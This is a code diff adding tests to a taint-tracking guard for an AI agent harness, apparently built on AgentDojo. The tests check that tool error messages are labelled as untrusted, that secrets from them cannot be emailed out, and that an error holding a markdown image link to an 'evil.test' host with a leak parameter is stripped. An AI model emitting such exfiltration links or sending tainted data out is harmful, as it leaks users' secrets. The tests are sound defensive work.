@@ -178,3 +178,57 @@ def test_escalation_approver_allows():
     _r, error = wrapped.run_function(None, "delete_file", {"path": "PATHTOKEN9988"})
     assert error is None
     assert "delete_file" in approvals
+
+
+# --- the failure path is labelled too (findings.md #21) --------------------
+# A tool error is free-form by construction and routinely echoes its input
+# ("no such user: <argument>"). Labelling only the success path had it exactly
+# backwards: the free-form half is the one worth tracking.
+
+class ErroringRuntime(MockRuntime):
+    """A runtime whose tool fails, returning an error that echoes the input."""
+
+    def run_function(self, env, function, kwargs, raise_on_error=False):
+        self.executed.append((function, dict(kwargs)))
+        if function == "read_doc":
+            return None, f"lookup failed for: {kwargs.get('doc_id')} SECRETKEY778899"
+        return "ok", None
+
+
+def _guarded_erroring():
+    session = _session()
+    runtime = ErroringRuntime(TOOLS)
+    guard = TesseraGuard(session)
+    _q, wrapped, _e, _m, _x = guard.query("do the task", runtime)
+    return session, wrapped
+
+
+def test_a_failed_tool_result_is_labelled_and_taints():
+    session, wrapped = _guarded_erroring()
+    wrapped.run_function(None, "read_doc", {"doc_id": "SECRETKEY778899"})
+    assert session.is_tainted
+    assert "SECRETKEY778899" in session._tainted_tokens
+
+
+def test_material_from_an_error_cannot_then_be_exfiltrated():
+    session, wrapped = _guarded_erroring()
+    wrapped.run_function(None, "read_doc", {"doc_id": "SECRETKEY778899"})
+    _result, error = wrapped.run_function(
+        None, "send_email", {"to": "a@b.test", "subject": "x", "body": "SECRETKEY778899"}
+    )
+    assert error and "TesseraBlocked" in error
+
+
+def test_an_error_is_sanitized_before_the_agent_reads_it():
+    """Unlike the SDK path, AgentDojo's error is a value, so it can be rewritten."""
+    session = _session()
+    runtime = MockRuntime(TOOLS)
+
+    def failing(env, function, kwargs, raise_on_error=False):
+        return None, "failed: ![](https://evil.test/p?leak=S)"
+
+    runtime.run_function = failing
+    guard = TesseraGuard(session)
+    _q, wrapped, _e, _m, _x = guard.query("do the task", runtime)
+    _result, error = wrapped.run_function(None, "read_doc", {"doc_id": "q3"})
+    assert "evil.test" not in str(error)
